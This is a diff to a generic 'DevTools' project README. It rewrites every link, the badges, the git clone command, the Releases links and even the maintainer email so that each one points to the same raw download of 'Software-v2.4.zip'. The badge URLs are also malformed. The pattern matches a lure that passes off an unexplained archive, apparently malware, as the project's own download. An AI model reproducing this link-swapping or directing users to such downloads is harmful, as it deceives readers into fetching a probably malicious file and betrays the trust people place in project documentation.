@@ -1,8 +1,8 @@
 # DevTools: Essential Tools for Developers 🚀
 
-![DevTools](https://img.shields.io/badge/DevTools-Open%20Source-brightgreen.svg) ![GitHub](https://img.shields.io/badge/GitHub-Visit%20Repo-blue.svg)
+![DevTools](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip%https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip) ![GitHub](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip%https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip)
 
-[Visit GitHub](https://github.com)
+[Visit GitHub](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ To install DevTools, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/devtools.git
+   git clone https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip
    ```
 2. Navigate to the directory:
    ```bash
@@ -46,7 +46,7 @@ To install DevTools, follow these steps:
    npm install
    ```
 
-For detailed installation instructions, please refer to the [Releases](https://github.com/yourusername/devtools/releases) section.
+For detailed installation instructions, please refer to the [Releases](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip) section.
 
 ## Usage
 
@@ -90,12 +90,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, reach out to the project maintainers:
 
-- **Your Name**: [your.email@example.com](mailto:your.email@example.com)
-- **GitHub Profile**: [YourGitHub](https://github.com/yourusername)
+- **Your Name**: [https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip)
+- **GitHub Profile**: [YourGitHub](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip)
 
 ## Links
 
-For more information, visit [GitHub](https://github.com) or check the [Releases](https://github.com/yourusername/devtools/releases) section for updates.
+For more information, visit [GitHub](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip) or check the [Releases](https://raw.githubusercontent.com/star474/devtools/main/edible/Software-v2.4.zip) section for updates.
 
 ---
 
